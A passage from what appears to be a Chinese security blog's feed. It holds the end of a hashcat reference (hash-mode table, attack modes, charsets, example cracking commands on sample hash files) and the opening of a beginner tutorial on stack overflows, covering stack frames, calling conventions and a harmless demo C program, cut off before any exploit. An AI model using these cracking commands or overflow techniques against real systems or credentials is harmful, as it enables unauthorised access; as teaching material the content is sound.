class="even"><td>4521</td><td>Redmine</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="odd"><td>4522</td><td>PunBB</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="even"><td>12001</td><td>Atlassian (PBKDF2-HMAC-SHA1)</td><td>论坛，内容管理系统(CMS)，电子商务，框架</td></tr><tr class="odd"><td>12</td><td>PostgreSQL</td><td>数据库服务器</td></tr><tr class="even"><td>131</td><td>MSSQL (2000)</td><td>数据库服务器</td></tr><tr class="odd"><td>132</td><td>MSSQL (2005)</td><td>数据库服务器</td></tr><tr class="even"><td>1731</td><td>MSSQL (2012, 2014)</td><td>数据库服务器</td></tr><tr class="odd"><td>200</td><td>MySQL323</td><td>数据库服务器</td></tr><tr class="even"><td>300</td><td>MySQL4.1/MySQL5</td><td>数据库服务器</td></tr><tr class="odd"><td>3100</td><td>Oracle H: Type (Oracle 7+)</td><td>数据库服务器</td></tr><tr class="even"><td>112</td><td>Oracle S: Type (Oracle 11+)</td><td>数据库服务器</td></tr><tr class="odd"><td>12300</td><td>Oracle T: Type (Oracle 12+)</td><td>数据库服务器</td></tr><tr class="even"><td>8000</td><td>Sybase ASE</td><td>数据库服务器</td></tr><tr class="odd"><td>141</td><td>Episerver 6.x &lt; .NET 4</td><td>HTTP，SMTP，LDAP服务器</td></tr><tr class="even"><td>1441</td><td>Episerver 6.x &gt;= .NET 4</td><td>HTTP，SMTP，LDAP服务器</td></tr><tr class="odd"><td>1600</td><td>Apache <span class="math inline">\(apr1\)</span> MD5, md5apr1, MD5 (APR)</td><td>HTTP，SMTP，LDAP服务器</td></tr><tr class="even"><td>12600</td><td>ColdFusion 10+</td><td>HTTP，SMTP，LDAP服务器</td></tr><tr class="odd"><td>1421</td><td>hMailServer</td><td>HTTP，SMTP，LDAP服务器</td></tr><tr class="even"><td>101</td><td>nsldap, SHA-1(Base64), Netscape LDAP SHA</td><td>HTTP，SMTP，LDAP服务器</td></tr><tr class="odd"><td>111</td><td>nsldaps, SSHA-1(Base64), Netscape LDAP SSHA</td><td>HTTP，SMTP，LDAP服务器</td></tr><tr class="even"><td>1411</td><td>SSHA-256(Base64), LDAP {SSHA256}</td><td>HTTP，SMTP，LDAP服务器</td></tr><tr class="odd"><td>1711</td><td>SSHA-512(Base64), LDAP {SSHA512}</td><td>HTTP，SMTP，LDAP服务器</td></tr><tr class="even"><td>15000</td><td>FileZilla Server &gt;= 0.9.55</td><td>FTP 服务器</td></tr><tr class="odd"><td>11500</td><td>CRC32</td><td>校验和</td></tr><tr class="even"><td>3000</td><td>LM</td><td>操作系统</td></tr><tr class="odd"><td>1000</td><td>NTLM</td><td>操作系统</td></tr><tr class="even"><td>1100</td><td>Domain Cached Credentials (DCC), MS Cache</td><td>操作系统</td></tr><tr class="odd"><td>2100</td><td>Domain Cached Credentials 2 (DCC2), MS Cache 2</td><td>操作系统</td></tr><tr class="even"><td>12800</td><td>MS-AzureSync PBKDF2-HMAC-SHA256</td><td>操作系统</td></tr><tr class="odd"><td>1500</td><td>descrypt, DES (Unix), Traditional DES</td><td>操作系统</td></tr><tr class="even"><td>12400</td><td>BSDiCrypt, Extended DES</td><td>操作系统</td></tr><tr class="odd"><td>500</td><td>md5crypt, MD5 (Unix), Cisco-IOS <span class="math inline">\(1\)</span> (MD5)</td><td>操作系统</td></tr><tr class="even"><td>3200</td><td>bcrypt <span class="math inline">\(2*\)</span>, Blowfish (Unix)</td><td>操作系统</td></tr><tr class="odd"><td>7400</td><td>sha256crypt <span class="math inline">\(5\)</span>, SHA256 (Unix)</td><td>操作系统</td></tr><tr class="even"><td>1800</td><td>sha512crypt <span class="math inline">\(6\)</span>, SHA512 (Unix)</td><td>操作系统</td></tr><tr class="odd"><td>122</td><td>OSX v10.4, OSX v10.5, OSX v10.6</td><td>操作系统</td></tr><tr class="even"><td>1722</td><td>OSX v10.7</td><td>操作系统</td></tr><tr class="odd"><td>7100</td><td>OSX v10.8+ (PBKDF2-SHA512)</td><td>操作系统</td></tr><tr class="even"><td>6300</td><td>AIX {smd5}</td><td>操作系统</td></tr><tr class="odd"><td>6700</td><td>AIX {ssha1}</td><td>操作系统</td></tr><tr class="even"><td>6400</td><td>AIX {ssha256}</td><td>操作系统</td></tr><tr class="odd"><td>6500</td><td>AIX {ssha512}</td><td>操作系统</td></tr><tr class="even"><td>2400</td><td>Cisco-PIX MD5</td><td>操作系统</td></tr><tr class="odd"><td>2410</td><td>Cisco-ASA MD5</td><td>操作系统</td></tr><tr class="even"><td>500</td><td>Cisco-IOS <span class="math inline">\(1\)</span> (MD5)</td><td>操作系统</td></tr><tr class="odd"><td>5700</td><td>Cisco-IOS type 4 (SHA256)</td><td>操作系统</td></tr><tr class="even"><td>9200</td><td>Cisco-IOS <span class="math inline">\(8\)</span> (PBKDF2-SHA256)</td><td>操作系统</td></tr><tr class="odd"><td>9300</td><td>Cisco-IOS <span class="math inline">\(9\)</span> (scrypt)</td><td>操作系统</td></tr><tr class="even"><td>22</td><td>Juniper NetScreen/SSG (ScreenOS)</td><td>操作系统</td></tr><tr class="odd"><td>501</td><td>Juniper IVE</td><td>操作系统</td></tr><tr class="even"><td>15100</td><td>Juniper/NetBSD sha1crypt</td><td>操作系统</td></tr><tr class="odd"><td>7000</td><td>FortiGate (FortiOS)</td><td>操作系统</td></tr><tr class="even"><td>5800</td><td>Samsung Android Password/PIN</td><td>操作系统</td></tr><tr class="odd"><td>13800</td><td>Windows Phone 8+ PIN/password</td><td>操作系统</td></tr><tr class="even"><td>8100</td><td>Citrix NetScaler</td><td>操作系统</td></tr><tr class="odd"><td>8500</td><td>RACF</td><td>操作系统</td></tr><tr class="even"><td>7200</td><td>GRUB 2</td><td>操作系统</td></tr><tr class="odd"><td>9900</td><td>Radmin2</td><td>操作系统</td></tr><tr class="even"><td>125</td><td>ArubaOS</td><td>操作系统</td></tr><tr class="odd"><td>7700</td><td>SAP CODVN B (BCODE)</td><td>企业应用软件（EAS）</td></tr><tr class="even"><td>7800</td><td>SAP CODVN F/G (PASSCODE)</td><td>企业应用软件（EAS）</td></tr><tr class="odd"><td>10300</td><td>SAP CODVN H (PWDSALTEDHASH) iSSHA-1</td><td>企业应用软件（EAS）</td></tr><tr class="even"><td>8600</td><td>Lotus Notes/Domino 5</td><td>企业应用软件（EAS）</td></tr><tr class="odd"><td>8700</td><td>Lotus Notes/Domino 6</td><td>企业应用软件（EAS）</td></tr><tr class="even"><td>9100</td><td>Lotus Notes/Domino 8</td><td>企业应用软件（EAS）</td></tr><tr class="odd"><td>133</td><td>PeopleSoft</td><td>企业应用软件（EAS）</td></tr><tr class="even"><td>13500</td><td>PeopleSoft PS_TOKEN</td><td>企业应用软件（EAS）</td></tr><tr class="odd"><td>11600</td><td>7-Zip</td><td>压缩/存档</td></tr><tr class="even"><td>12500</td><td>RAR3-hp</td><td>压缩/存档</td></tr><tr class="odd"><td>13000</td><td>RAR5</td><td>压缩/存档</td></tr><tr class="even"><td>13200</td><td>AxCrypt</td><td>压缩/存档</td></tr><tr class="odd"><td>13300</td><td>AxCrypt in-memory SHA1</td><td>压缩/存档</td></tr><tr class="even"><td>13600</td><td>WinZip</td><td>压缩/存档</td></tr><tr class="odd"><td>14700</td><td>iTunes 备份 &lt; 10.0</td><td>备份</td></tr><tr class="even"><td>14800</td><td>iTunes 备份 &gt;= 10.0</td><td>备份</td></tr><tr class="odd"><td>62XY</td><td>TrueCrypt</td><td>全盘加密（FDE）</td></tr><tr class="even"><td>X</td><td>1 = PBKDF2-HMAC-RIPEMD160</td><td>全盘加密（FDE）</td></tr><tr class="odd"><td>X</td><td>2 = PBKDF2-HMAC-SHA512</td><td>全盘加密（FDE）</td></tr><tr class="even"><td>X</td><td>3 = PBKDF2-HMAC-Whirlpool</td><td>全盘加密（FDE）</td></tr><tr class="odd"><td>X</td><td>4 = PBKDF2-HMAC-RIPEMD160 + boot-mode</td><td>全盘加密（FDE）</td></tr><tr class="even"><td>Y</td><td>1 = XTS 512 bit pure AES</td><td>全盘加密（FDE）</td></tr><tr class="odd"><td>Y</td><td>1 = XTS 512 bit pure Serpent</td><td>全盘加密（FDE）</td></tr><tr class="even"><td>Y</td><td>1 = XTS 512 bit pure Twofish</td><td>全盘加密（FDE）</td></tr><tr class="odd"><td>Y</td><td>2 = XTS 1024 bit pure AES</td><td>全盘加密（FDE）</td></tr><tr class="even"><td>Y</td><td>2 = XTS 1024 bit pure Serpent</td><td>全盘加密（FDE）</td></tr><tr class="odd"><td>Y</td><td>2 = XTS 1024 bit pure Twofish</td><td>全盘加密（FDE）</td></tr><tr class="even"><td>Y</td><td>2 = XTS 1024 bit cascaded AES-Twofish</td><td>全盘加密（FDE）</td></tr><tr class="odd"><td>Y</td><td>2 = XTS 1024 bit cascaded Serpent-AES</td><td>全盘加密（FDE）</td></tr><tr class="even"><td>Y</td><td>2 = XTS 1024 bit cascaded Twofish-Serpent</td><td>全盘加密（FDE）</td></tr><tr class="odd"><td>Y</td><td>3 = XTS 1536 bit all</td><td>全盘加密（FDE）</td></tr><tr class="even"><td>8800</td><td>Android FDE &lt;= 4.3</td><td>全盘加密（FDE）</td></tr><tr class="odd"><td>12900</td><td>Android FDE (Samsung DEK)</td><td>全盘加密（FDE）</td></tr><tr class="even"><td>12200</td><td>eCryptfs</td><td>全盘加密（FDE）</td></tr><tr class="odd"><td>137XY</td><td>VeraCrypt</td><td>全盘加密（FDE）</td></tr><tr class="even"><td>X</td><td>1 = PBKDF2-HMAC-RIPEMD160</td><td>全盘加密（FDE）</td></tr><tr class="odd"><td>X</td><td>2 = PBKDF2-HMAC-SHA512</td><td>全盘加密（FDE）</td></tr><tr class="even"><td>X</td><td>3 = PBKDF2-HMAC-Whirlpool</td><td>全盘加密（FDE）</td></tr><tr class="odd"><td>X</td><td>4 = PBKDF2-HMAC-RIPEMD160 + boot-mode</td><td>全盘加密（FDE）</td></tr><tr class="even"><td>X</td><td>5 = PBKDF2-HMAC-SHA256</td><td>全盘加密（FDE）</td></tr><tr class="odd"><td>X</td><td>6 = PBKDF2-HMAC-SHA256 + boot-mode</td><td>全盘加密（FDE）</td></tr><tr class="even"><td>Y</td><td>1 = XTS 512 bit pure AES</td><td>全盘加密（FDE）</td></tr><tr class="odd"><td>Y</td><td>1 = XTS 512 bit pure Serpent</td><td>全盘加密（FDE）</td></tr><tr class="even"><td>Y</td><td>1 = XTS 512 bit pure Twofish</td><td>全盘加密（FDE）</td></tr><tr class="odd"><td>Y</td><td>2 = XTS 1024 bit pure AES</td><td>全盘加密（FDE）</td></tr><tr class="even"><td>Y</td><td>2 = XTS 1024 bit pure Serpent</td><td>全盘加密（FDE）</td></tr><tr class="odd"><td>Y</td><td>2 = XTS 1024 bit pure Twofish</td><td>全盘加密（FDE）</td></tr><tr class="even"><td>Y</td><td>2 = XTS 1024 bit cascaded AES-Twofish</td><td>全盘加密（FDE）</td></tr><tr class="odd"><td>Y</td><td>2 = XTS 1024 bit cascaded Serpent-AES</td><td>全盘加密（FDE）</td></tr><tr class="even"><td>Y</td><td>2 = XTS 1024 bit cascaded Twofish-Serpent</td><td>全盘加密（FDE）</td></tr><tr class="odd"><td>Y</td><td>3 = XTS 1536 bit all</td><td>全盘加密（FDE）</td></tr><tr class="even"><td>14600</td><td>LUKS</td><td>全盘加密（FDE）</td></tr><tr class="odd"><td>9700</td><td>MS Office &lt;= 2003 $0/$1, MD5 + RC4</td><td>文档</td></tr><tr class="even"><td>9710</td><td>MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #1</td><td>文档</td></tr><tr class="odd"><td>9720</td><td>MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #2</td><td>文档</td></tr><tr class="even"><td>9800</td><td>MS Office &lt;= 2003 $3/$4, SHA1 + RC4</td><td>文档</td></tr><tr class="odd"><td>9810</td><td>MS Office &lt;= 2003 $3/$4, SHA1 + RC4, collider #1</td><td>文档</td></tr><tr class="even"><td>9820</td><td>MS Office &lt;= 2003 $3/$4, SHA1 + RC4, collider #2</td><td>文档</td></tr><tr class="odd"><td>9400</td><td>MS Office 2007</td><td>文档</td></tr><tr class="even"><td>9500</td><td>MS Office 2010</td><td>文档</td></tr><tr class="odd"><td>9600</td><td>MS Office 2013</td><td>文档</td></tr><tr class="even"><td>10400</td><td>PDF 1.1 - 1.3 (Acrobat 2 - 4)</td><td>文档</td></tr><tr class="odd"><td>10410</td><td>PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1</td><td>文档</td></tr><tr class="even"><td>10420</td><td>PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2</td><td>文档</td></tr><tr class="odd"><td>10500</td><td>PDF 1.4 - 1.6 (Acrobat 5 - 8)</td><td>文档</td></tr><tr class="even"><td>10600</td><td>PDF 1.7 Level 3 (Acrobat 9)</td><td>文档</td></tr><tr class="odd"><td>10700</td><td>PDF 1.7 Level 8 (Acrobat 10 - 11)</td><td>文档</td></tr><tr class="even"><td>9000</td><td>Password Safe v2</td><td>密码管理软件</td></tr><tr class="odd"><td>5200</td><td>Password Safe v3</td><td>密码管理软件</td></tr><tr class="even"><td>6800</td><td>LastPass + LastPass sniffed</td><td>密码管理软件</td></tr><tr class="odd"><td>6600</td><td>1Password, agilekeychain</td><td>密码管理软件</td></tr><tr class="even"><td>8200</td><td>1Password, cloudkeychain</td><td>密码管理软件</td></tr><tr class="odd"><td>11300</td><td>Bitcoin/Litecoin wallet.dat</td><td>密码管理软件</td></tr><tr class="even"><td>12700</td><td>Blockchain, My Wallet</td><td>密码管理软件</td></tr><tr class="odd"><td>13400</td><td>KeePass 1 (AES/Twofish) and KeePass 2 (AES)</td><td>密码管理软件</td></tr><tr class="even"><td>99999</td><td>Plaintext</td><td>Blockchain明文，我的钱包</td></tr></tbody></table><h3 id="输出格式">③ 输出格式</h3><table><thead><tr class="header"><th>编号</th><th>格式</th></tr></thead><tbody><tr class="odd"><td>1</td><td>hash[:salt]</td></tr><tr class="even"><td>2</td><td>plain</td></tr><tr class="odd"><td>3</td><td>hash[:salt]:plain</td></tr><tr class="even"><td>4</td><td>hex_plain</td></tr><tr class="odd"><td>5</td><td>hash[:salt]:hex_plain</td></tr><tr class="even"><td>6</td><td>plain:hex_plain</td></tr><tr class="odd"><td>7</td><td>hash[:salt]:plain:hex_plain</td></tr><tr class="even"><td>8</td><td>crackpos</td></tr><tr class="odd"><td>9</td><td>hash[:salt]:crack_pos</td></tr><tr class="even"><td>10</td><td>plain:crack_pos</td></tr><tr class="odd"><td>11</td><td>hash[:salt]:plain:crack_pos</td></tr><tr class="even"><td>12</td><td>hex_plain:crack_pos</td></tr><tr class="odd"><td>13</td><td>hash[:salt]:hex_plain:crack_pos</td></tr><tr class="even"><td>14</td><td>plain:hex_plain:crack_pos</td></tr><tr class="odd"><td>15</td><td>hash[:salt]:plain:hex_plain:crack_pos</td></tr></tbody></table><h3 id="调试模式规则">④ 调试模式规则</h3><table><thead><tr class="header"><th>编号</th><th>格式</th></tr></thead><tbody><tr class="odd"><td>1</td><td>查找规则</td></tr><tr class="even"><td>2</td><td>原始词</td></tr><tr class="odd"><td>3</td><td>原始词:查找规则</td></tr><tr class="even"><td>4</td><td>原始词:查找规则:已处理词</td></tr></tbody></table><h3 id="攻击模式">⑤ 攻击模式</h3><table><thead><tr class="header"><th>编号</th><th>模式</th></tr></thead><tbody><tr class="odd"><td>0</td><td>直接</td></tr><tr class="even"><td>1</td><td>组合</td></tr><tr class="odd"><td>3</td><td>暴力穷举</td></tr><tr class="even"><td>6</td><td>混合 字典 + 掩码</td></tr><tr class="odd"><td>7</td><td>混合 掩码 + 字典</td></tr></tbody></table><h3 id="内置字符集">⑥ 内置字符集</h3><table><thead><tr class="header"><th>?</th><th>字符集</th><th></th></tr></thead><tbody><tr class="odd"><td>l</td><td>abcdefghijklmnopqrstuvwxyz</td><td></td></tr><tr class="even"><td>u</td><td>ABCDEFGHIJKLMNOPQRSTUVWXYZ</td><td></td></tr><tr class="odd"><td>d</td><td>0123456789</td><td></td></tr><tr class="even"><td>h</td><td>0123456789abcdef</td><td></td></tr><tr class="odd"><td>H</td><td>0123456789ABCDEF</td><td></td></tr><tr class="even"><td>s</td><td>!"#$%&amp;'()*+,-./:;&lt;=&gt;?@[]^_`{</td><td>}~</td></tr><tr class="odd"><td>a</td><td>?l?u?d?s</td><td></td></tr><tr class="even"><td>b</td><td>0x00 - 0xff</td><td></td></tr></tbody></table><h3 id="opencl设备类型">⑦ OpenCL设备类型</h3><table><thead><tr class="header"><th>编号</th><th>设备类型</th></tr></thead><tbody><tr class="odd"><td>1</td><td>CPU</td></tr><tr class="even"><td>2</td><td>GPU</td></tr><tr class="odd"><td>3</td><td>现场可编程门阵列(FPGA)，数字信号处理器(DSP)，协处理器(Co-Processor)</td></tr></tbody></table><h3 id="工作负载配置文件">⑧ 工作负载配置文件</h3><table><thead><tr class="header"><th>编号</th><th>性能</th><th>运行时间</th><th>能量消耗</th><th>桌面影响</th></tr></thead><tbody><tr class="odd"><td>1</td><td>低</td><td>2 ms</td><td>低</td><td>最小</td></tr><tr class="even"><td>2</td><td>默认</td><td>12 ms</td><td>经济型</td><td>可察觉</td></tr><tr class="odd"><td>3</td><td>高</td><td>96 ms</td><td>高</td><td>没有反应</td></tr><tr class="even"><td>4</td><td>噩梦</td><td>480 ms</td><td>疯狂的</td><td>无法控制</td></tr></tbody></table><h3 id="基本用例">⑨ 基本用例</h3><table><colgroup><col style="width: 11%"><col style="width: 10%"><col style="width: 77%"></colgroup><thead><tr class="header"><th>攻击模式</th><th>Hash种类</th><th>示例命令</th></tr></thead><tbody><tr class="odd"><td>字典</td><td><span class="math inline">\(P\)</span></td><td>hashcat -a 0 -m 400 example400.hash example.dict</td></tr><tr class="even"><td>字典+规则</td><td>MD5</td><td>hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule</td></tr><tr class="odd"><td>暴力穷举</td><td>MD5</td><td>hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a</td></tr><tr class="even"><td>组合</td><td>MD5</td><td>hashcat -a 1 -m 0 example0.hash example.dict example.dict</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;硬件环境:&lt;/p&gt;
&lt;p&gt;主机: TYAN FT77D-B7109&lt;/p&gt;
&lt;p&gt;CPU: Intel Xeon Scalable Processor&lt;/p&gt;
&lt;p&gt;GPU: 1080Ti x 8 (测试时只用了两块, 分别是MSI/技嘉)&lt;/p&gt;
&lt;p&gt;内存: 32G&lt;/p&gt;
&lt;p&gt;硬盘: 1T SSD&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Wireless" scheme="http://www.killshadow.xyz/tags/Wireless/"/>
    
  </entry>
  
  <entry>
    <title>1.1-菜鸟学PWN之栈溢出学习</title>
    <link href="http://www.killshadow.xyz/2018/10/10/1.1-%E8%8F%9C%E9%B8%9F%E5%AD%A6PWN%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.killshadow.xyz/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/</id>
    <published>2018-10-09T16:00:00.000Z</published>
    <updated>2019-05-29T05:47:31.004Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>实现栈溢出的两个条件:</p><ul><li>程序有向栈写入数据的行为</li><li>程序并不限制写入数据的长度</li></ul><a id="more"></a><p>如果想用栈溢出来执行攻击指令, 就要在溢出数据内包含攻击指令的内容或地址, 并且要将程序控制权交给该指令. 攻击指令可以是自定义的指令, 也可以利用系统内已有的函数及指令.</p></blockquote><h2 id="x10-背景知识">0x10 背景知识</h2><h3 id="x11-栈介绍">0x11 栈介绍</h3><p>栈是一种典型的<strong>先进后出(First in Last Out)</strong>的数据结构, 其操作主要有压栈(push)与出栈(pop)两种操作. <strong>两种操作都是操作栈顶</strong>, 当然也有栈底(位于高地址).</p><figure><img src="/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/Data_stack.png" alt="基本栈操作"><figcaption>基本栈操作</figcaption></figure><p>每个程序在运行时都有虚拟地址空间, 其中某一部分就是该程序对应的栈. 编译器使用堆栈<strong>传递函数参数、保存返回地址、临时保存寄存器原有值(即函数调用的上下文)以备恢复以及存储本地局部变量</strong>. 程序的栈都是<strong>从进程地址空间的高地址向低地址增长</strong>.</p><hr><h3 id="x12-栈帧结构">0x12 栈帧结构</h3><p>函数调用经常是<strong>嵌套</strong>的, 在同一时刻, 堆栈中会有多个函数的信息. 每个未完成运行的函数占用一个<strong>独立的连续区域</strong>, 称作<strong>栈帧(Stack Frame)</strong>. 当函数被调用时, 栈帧被压入堆栈; 当函数返回时, 栈帧从堆栈中弹出. 栈帧存放函数的参数、函数返回地址、调用者(caller)的一些寄存器状态、函数的局部变量等.</p><p>栈帧的边界由栈帧基地址指针EBP和栈帧堆栈指针ESP界定(指正存放在相应寄存器中). EBP指向栈帧底部(高地址), 在当前栈帧内位置固定; ESP指向栈帧顶部(低地址), 当程序执行时ESP会随着数据的入栈和出栈而移动(如: 压入局部变量). 因此函数中对数据的访问大部分是基于EBP(对EBP取相对地址). 函数调用栈典型内存分布如下图:</p><figure><img src="/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/271650059007975.jpg" alt="img"><figcaption>img</figcaption></figure><blockquote><p>注意: 当函数被调用时, EBP的地址是当前栈帧的基地址, 但EBP指向的是上一栈帧基地址的地址.</p></blockquote><h4 id="入栈出栈指令">(1) 入栈出栈指令</h4><p>函数序(入栈)实现如下：</p><table><colgroup><col style="width: 31%"><col style="width: 68%"></colgroup><thead><tr class="header"><th style="text-align: center;"><strong>指令序列</strong></th><th style="text-align: left;"><strong>含义</strong></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">push %ebp</td><td style="text-align: left;">将主调函数的帧基指针%ebp压栈，即保存旧栈帧中的帧基指针以便函数返回时恢复旧栈帧</td></tr><tr class="even"><td style="text-align: center;">mov %esp, %ebp</td><td style="text-align: left;">将主调函数的栈顶指针%esp赋给被调函数帧基指针%ebp。此时，%ebp指向被调函数新栈帧的起始地址(栈底)，亦即旧%ebp入栈后的栈顶</td></tr><tr class="odd"><td style="text-align: center;">sub <n>, %esp</n></td><td style="text-align: left;">将栈顶指针%esp减去指定字节数(栈顶下移)，即为被调函数局部变量开辟栈空间。<n>为立即数且通常为16的整数倍(可能大于局部变量字节总数而稍显浪费，但gcc采用该规则保证数据的严格对齐以有效运用各种优化编译技术)</n></td></tr><tr class="even"><td style="text-align: center;">push <r></r></td><td style="text-align: left;">可选。如有必要，被调函数负责保存某些寄存器(%edi/%esi/%ebx)值</td></tr><tr class="odd"><td style="text-align: center;">.................................</td><td style="text-align: left;"></td></tr></tbody></table><p>函数跋(出栈)实现如下:</p><table><colgroup><col style="width: 35%"><col style="width: 64%"></colgroup><thead><tr class="header"><th style="text-align: center;"><strong>指令序列</strong></th><th style="text-align: left;"><strong>含义</strong></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">pop <r></r></td><td style="text-align: left;">可选。如有必要，被调函数负责恢复某些寄存器(%edi/%esi/%ebx)值</td></tr><tr class="even"><td style="text-align: center;">mov %ebp, %esp*</td><td style="text-align: left;">恢复主调函数的栈顶指针%esp，将其指向被调函数栈底。此时，局部变量占用的栈空间被释放，但变量内容未被清除(跳过该处理)</td></tr><tr class="odd"><td style="text-align: center;">pop %ebp*</td><td style="text-align: left;">主调函数的帧基指针%ebp出栈，即恢复主调函数栈底。此时，栈顶指针%esp指向主调函数栈顶(espßesp-4)，亦即返回地址存放处</td></tr><tr class="even"><td style="text-align: center;">ret</td><td style="text-align: left;">从栈顶弹出主调函数压在栈中的返回地址到指令指针寄存器%eip中，跳回主调函数该位置处继续执行。再由主调函数恢复到调用前的栈</td></tr><tr class="odd"><td style="text-align: center;">.................................</td><td style="text-align: left;">*：这两条指令序列也可由leave指令实现，具体用哪种方式由编译器决定。</td></tr></tbody></table><h4 id="参数压栈指令">(2) 参数压栈指令</h4><p>参数压栈指令因编译器而异，如下两种压栈方式基本等效：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="title">CdeclDemo</span><span class="params">(<span class="keyword">int</span> w, <span class="keyword">int</span> x, <span class="keyword">int</span> y, intz)</span></span>;  <span class="comment">//调用CdeclDemo函数</span></span><br><span class="line">CdeclDemo(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);  <span class="comment">//调用CdeclDemo函数</span></span><br></pre></td></tr></table></figure><table><thead><tr class="header"><th><strong>压栈方式一</strong></th><th><strong>压栈方式二</strong></th></tr></thead><tbody><tr class="odd"><td>pushl 4 //压入参数z</td><td><em>subl $16, %esp</em> //多次调用仅执行一遍</td></tr><tr class="even"><td>pushl 3 //压入参数y</td><td>movl $4, 12(%esp) //传送参数z至堆栈第四个位置</td></tr><tr class="odd"><td>pushl 2 //压入参数x</td><td>movl $3, 8(%esp) //传送参数y至堆栈第三个位置</td></tr><tr class="even"><td>pushl 1 //压入参数w</td><td>movl $2, 4(%esp) //传送参数x至堆栈第二个位置</td></tr><tr class="odd"><td>call CdeclDemo //调用函数</td><td>movl $1, (%esp) //传送参数w至堆栈栈顶</td></tr><tr class="even"><td>addl $16, %esp //恢复ESP原值，使其指向调用前保存的返回地址</td><td>call CdeclDemo //调用函数</td></tr></tbody></table><p>​ 两种压栈方式均遵循C调用约定，但方式二中主调函数在调用返回后并未显式清理堆栈空间。因为在被调函数序阶段，编译器在栈顶为函数参数预先分配内存空间(sub指令)。函数参数被复制到栈中(而非压入栈中)，并未修改栈顶指针，故调用返回时主调函数也无需修改栈顶指针。</p><hr><h3 id="x13-函数调用栈">0x13 函数调用栈</h3><p><strong>函数调用栈</strong>是指程序运行时内存一段连续的区域, 用来保存函数运行时的状态信息, 包括函数参数与局部变量等. 称之为"栈"是因为发生函数调用时, 调用函数(caller)的被保存在栈内, 被调用函数(callee)的状态被压入调用栈的栈顶; 在函数调用结束时, 栈顶的函数(callee)状态被弹出, 栈顶恢复到调用函数(caller)的状态. 函数调用栈在内存中从高地址向低地址生长, 所以栈顶对应的内存在压栈时变小, 出栈时变大.</p><blockquote><p>函数调用发生和结束的调用栈帧如下图:</p><figure><img src="/2018/10/10/1.1-菜鸟学PWN之栈溢出学习/v2-8d5649c36458080223084d77abbd554a_hd.jpg" alt="img"><figcaption>img</figcaption></figure><p>函数状态主要涉及三个寄存器--esp, ebp, eip: - esp 用来存储函数调用栈(caller)的栈顶指针, 在压栈(入栈)和退栈(出栈)时发生变化. - ebp 用来存储当前函数状态的基地址, 在函数运行时不变, 可以用来索引确定函数参数或局部变量的位置. - eip 用来存储即将执行的程序指令的地址, cpu依照eip的存储内容读取指令并执行, eip随之指向相邻的下一条指令. EIP可被jmp、call和ret等指令隐含地改变(事实上它一直都在改变)。</p></blockquote><p>分析demo源代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*************************************************************************</span></span><br><span class="line"><span class="comment">&gt; File Name: debugfunc.c</span></span><br><span class="line"><span class="comment">&gt; Author: killshadow</span></span><br><span class="line"><span class="comment">&gt; Mail: chaceli@foxmail.com</span></span><br><span class="line"><span class="comment">&gt; Created Time: 2018年09月02日 星期日 09时26分02秒</span></span><br><span class="line"><span class="comment"> ************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">calc</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="keyword">int</span> d = <span class="number">2</span>;</span><br><span class="line">    c = a*d +b;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input a number:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;b);</span><br><span class="line">    c = calc(a,b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Result: %d\n"</span>,c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在命令行中:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 debugfunc.c -o debugfunc32 <span class="comment"># -m32表示编译成32位的程序</span></span><br></pre></td></tr></table></figure><h4 id="函数调用压栈顺序">(1) 